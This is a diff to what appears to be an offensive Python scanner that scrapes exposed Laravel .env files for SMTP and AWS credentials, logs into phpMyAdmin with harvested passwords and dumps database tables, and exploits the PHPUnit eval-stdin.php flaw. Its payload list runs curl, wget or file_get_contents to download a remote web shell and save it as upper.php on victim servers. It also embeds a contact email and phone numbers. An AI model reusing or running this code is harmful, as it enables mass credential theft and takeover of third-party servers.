@@ -29,12 +29,12 @@ try:
     cfg.read('settings.ini')
     cfg.sections()
     email_receiver = cfg['SETTINGS']['EMAIL_RECEIVER']
-    default_timeout = cfg['SETTINGS']['DEFAULT_TIMEOUT']
+    y = cfg['SETTINGS']['DEFAULT_TIMEOUT']
     phone_number = cfg['SETTINGS']['PHONE_NUMBER']
 except:
     cfg['SETTINGS'] = {}
     cfg['SETTINGS']['EMAIL_RECEIVER'] = 'stilajg@hotmail.com'
-    cfg['SETTINGS']['PHONE_NUMBER'] = '+6289667843580'
+    cfg['SETTINGS']['PHONE_NUMBER'] = '+628952'
     cfg['SETTINGS']['DEFAULT_TIMEOUT'] = '20'
     with open('settings.ini', 'a') as config:
         cfg.write(config)
@@ -76,11 +76,12 @@ except:
         '/database/.env',
         '/public/.env',
         '/[DOMAIN]/.env'
+        '',
     ]
     for pet in path:
         open('path.txt', 'a').write(pet + '\n')
 
-#socket.setdefaulttimeout(int(default_timeout))
+#socket.setdefaulttimeout(15)
 colorama.init(autoreset=True)
 os.system('cls' if os.name == 'nt' else 'clear')
 # warna ////
@@ -273,7 +274,7 @@ class grabber:
                                         else:
                                             smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2],satu.split('|')[3], satu.split('|')[4])
                                         oke += 1
-                                    elif '.amazonaws.com' in host:
+                                    elif '.amazonaws.' in host:
                                         open('Result/SMTP/smtp_aws.txt', 'a').write(satu + '\n')
                                         if email_receiver == 'example@domain.com':
                                             pass
@@ -1684,7 +1685,7 @@ def gas(tar):
         req = requests.get(
             tss + i,
             headers=head,
-            timeout=int(default_timeout),
+            timeout=15,
             allow_redirects=False,
             verify=False
         ).text
@@ -1698,7 +1699,7 @@ def gas(tar):
             data={
                 '0x[]': 'ridho'
             },
-            timeout=int(default_timeout),
+            timeout=15,
             allow_redirects=False,
             verify=False
         ).text
@@ -1745,9 +1746,9 @@ def gas(tar):
 
 
 exp = [
-    '<?php system("curl -O https://pastebin.com/raw/QGrjKCsR"); system("mv QGrjKCsR upper.php"); ?>',
+    '<?php system("curl -O https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php"); system("mv QGrjKCsR upper.php"); ?>',
     '<?php system("wget https://pastebin.com/raw/QGrjKCsR -O upper.php"); ?>',
-    '<?php fwrite(fopen("upper.php","w+"),file_get_contents("https://pastebin.com/raw/QGrjKCsR")); ?>'
+    '<?php fwrite(fopen("upper.php","w+"),file_get_contents("https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php")); ?>'
 ]
 
 
@@ -1755,7 +1756,7 @@ def phpunit(target):
     url_req = target.replace('.env', 'vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
     vulner = False
     for rce in exp:
-        r = requests.get(url_req, data=rce, headers=head, allow_redirects=False, timeout=int(default_timeout))
+        r = requests.get(url_req, data=rce, headers=head, allow_redirects=False, timeout=15)
         tes_point = requests.get(url_req.replace('eval-stdin.php', 'upper.php'), headers=head, timeout=15)
         if 'Vuln!!' in tes_point.text:
             with open('Result/shell.txt', 'a') as epep:
@@ -1777,7 +1778,7 @@ def phpmyadmin(target, user, pw):
         elif 'https://' in target:
             pol = 'https://' + parser_url(target)
         req = requests.Session()
-        uwu = req.get(pol + '/phpmyadmin', headers=head, timeout=int(default_timeout))
+        uwu = req.get(pol + '/phpmyadmin', headers=head, timeout=15)
         if '<title>phpMyAdmin</title>' in uwu.text or 'pma_username' in uwu.text:
             #if 'pma_servername' in uwu.text:
             #    open('phpmyadmin.txt','a').write(pol+'/phpmyadmin\n')
@@ -1794,7 +1795,7 @@ def phpmyadmin(target, user, pw):
                 'token': token
             }
             # print(data)
-            coba = req.post(pol + '/phpmyadmin/index.php', data=data, timeout=int(default_timeout))
+            coba = req.post(pol + '/phpmyadmin/index.php', data=data, timeout=15)
             if 'Log out' in coba.text or token in coba.url:
                 #print(coba.text)
                 open('Result/phpmyadmin.txt', 'a').write(pol + '/phpmyadmin' + '|{}|{}'.format(user, pw) + '\n')
@@ -1816,7 +1817,7 @@ def phpmyadmin(target, user, pw):
                 if len(link_db) != 0:
                     links_table = []
                     for dbb in link_db:
-                        shit = req.get(pol+'/phpmyadmin/'+dbb,timeout=int(default_timeout))
+                        shit = req.get(pol+'/phpmyadmin/'+dbb,timeout=15)
                         supp2 = bs4.BeautifulSoup(shit.text.encode('utf-8'),'html.parser')
                         for table in supp2.find_all('a'):
                             try:
@@ -1831,7 +1832,7 @@ def phpmyadmin(target, user, pw):
                         if len(links_table) != 0:
                             for colum in links_table:
                                 try:
-                                    men = req.get(pol+'/phpmyadmin/'+colum,timeout=int(default_timeout))
+                                    men = req.get(pol+'/phpmyadmin/'+colum,timeout=15)
                                     supp3 = bs4.BeautifulSoup(men.text.encode('utf-8'),'html.parser')
                                     #for fom in supp3.find_all('form',{'action':'sql.php'},{'method':'post'}):
                                     #    print(fom)
@@ -1866,7 +1867,7 @@ def phpmyadmin(target, user, pw):
                 return False
         else:
             req = requests.Session()
-            uwu = req.get(pol + '/phpMyAdmin', headers=head, timeout=int(default_timeout))
+            uwu = req.get(pol + '/phpMyAdmin', headers=head, timeout=15)
             if 'pma_username' in uwu.text:
                 if "pma_servername" in uwu.text:
                     open('phpmyadmin.txt','a').write(pol+'/phpMyAdmin\n')
@@ -1878,7 +1879,7 @@ def phpmyadmin(target, user, pw):
                     'target': 'index.php',
                     'token': token
                 }
-                coba = req.post(pol + '/phpMyAdmin/index.php', data=data, timeout=int(default_timeout))
+                coba = req.post(pol + '/phpMyAdmin/index.php', data=data, timeout=15)
                 if 'Log out' in coba.text or token in coba.url:
                     open('Result/phpmyadmin.txt', 'a').write(pol + '/phpMyAdmin' + '|{}|{}'.format(user, pw) + '\n')
                     return True
@@ -2439,6 +2440,7 @@ class laravel_grabber:
                     print(merah + '#' + reset + ' {} - '.format(tos['url']) + merah + "Cant Get Everything")
         except:
             print(kuning + '#' + reset + ' {} - '.format(ts) + kuning + "Cant Access Site")
+            #print(er)
 
     def cekHttp(self, ez):
         resume = False
@@ -2542,7 +2544,7 @@ def random_color():
     return random.choice(tuple(colors))
 def banner():
     print('''
-    {}=,    (\_/)    ,=  ( Author : Ridho )
+    {}=,    (\_/)    ,=  ( Author : hchdh )
      {}/`-'--(")--'-'\   ( fb     : fb.me/mita )
     {}/     (___)     \  ( wa     : wa.me/+628311    )
    {}/.-.-./ " " \.-.-.\ ( version : 1.5 )
